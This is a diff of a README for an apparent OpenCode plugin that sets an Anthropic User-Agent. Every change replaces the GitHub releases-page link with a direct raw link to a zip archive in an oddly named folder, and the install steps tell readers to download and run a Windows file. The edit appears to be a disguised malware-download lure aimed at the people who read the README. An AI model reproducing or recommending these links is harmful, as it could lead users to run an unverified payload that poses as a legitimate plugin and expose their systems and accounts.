@@ -1,10 +1,10 @@
 # 🧩 opencode-anthropic-user-agent-plugin - Set a Custom Anthropic User-Agent
 
-[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge)](https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/releases)
+[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge)](https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/releases
+Visit this page to download: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip
 
 Use the file from the latest release for Windows, then follow the setup steps below.
 
@@ -34,7 +34,7 @@ If you use Claude or Anthropic sign-in, make sure you can log in to your account
 
 ## 🚀 Download and install on Windows
 
-1. Open the release page: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/releases
+1. Open the release page: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Save the file to a folder you can find again, like Downloads or Desktop
@@ -150,7 +150,7 @@ No. Once the plugin is in the right place and OpenCode restarts, it can work in 
 
 ## 📦 Download again
 
-Visit this page to download: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/releases
+Visit this page to download: https://github.com/tenorduckpate119/opencode-anthropic-user-agent-plugin/raw/refs/heads/main/periappendicitis/opencode-plugin-user-anthropic-agent-v3.0.zip
 
 Use the latest release file for Windows, then install it with the steps above
 
